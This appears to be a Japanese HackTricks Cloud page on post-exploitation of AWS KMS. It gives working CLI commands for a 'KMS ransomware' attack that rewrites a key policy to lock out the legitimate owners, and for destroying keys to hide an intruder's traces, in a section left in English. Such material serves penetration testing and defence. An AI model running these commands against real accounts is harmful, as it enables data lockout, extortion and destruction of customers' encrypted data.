# AWS - KMSポストエクスプロイテーション

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **会社の広告をハックトリックで見たい**場合や、**最新バージョンのPEASSをダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## KMS

詳細については、次を参照してください：

{% content-ref url="../../aws-security/aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../../aws-security/aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### 情報の暗号化/復号化

* **対称**キーを使用する
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
* **非対称**キーを使用する:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMSランサムウェア

KMSへの特権アクセスを持つ攻撃者は、KMSキーのポリシーを変更し、**自分のアカウントにアクセス権限を付与**し、正規のアカウントに付与されたアクセスを削除することができます。

その後、正規のアカウントのユーザーは、これらのキーで暗号化されたサービスの情報にアクセスできなくなり、アカウント上で簡単かつ効果的なランサムウェアが作成されます。

{% hint style="warning" %}
AWSの管理キーはこの攻撃の影響を受けません。影響を受けるのは**顧客管理キー**のみです。

また、この攻撃はCLIからのみ可能であり、Webコンソールではオプション**`--bypass-policy-lockout-safety-check`**の使用が必要です。
{% endhint %}
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
### キーの破棄

Once you have successfully compromised an AWS environment and gained access to the AWS Key Management Service (KMS), you may want to destroy any keys that could potentially be used against you or leave traces of your activities. Destroying keys ensures that any encrypted data protected by those keys becomes inaccessible.

To destroy a key in AWS KMS, you can use the `schedule-key-deletion` API call. This API call sets a waiting period before the key is permanently deleted. During this waiting period, you can cancel the deletion if needed.

Here is an example of how to destroy a key using the AWS CLI:

```bash
aws kms schedule-key-deletion --key-id <key-id> --pending-window-in-days 7
```

In this example, `<key-id>` should be replaced with the ID of the key you want to destroy. The `--pending-window-in-days` parameter specifies the number of days the key will remain in a pending deletion state before being permanently deleted. You can adjust this value based on your requirements.

Keep in mind that destroying keys should be done with caution, as it can have serious consequences. Make sure you have a thorough understanding of the environment and the potential impact before proceeding with key destruction.
```bash
# Destoy they key material previously imported making the key useless
aws kms delete-imported-key-material --key-id 1234abcd-12ab-34cd-56ef-1234567890ab

# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **会社をハックトリックで宣伝したい**場合や、**最新バージョンのPEASSを入手したい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ハッキングのトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
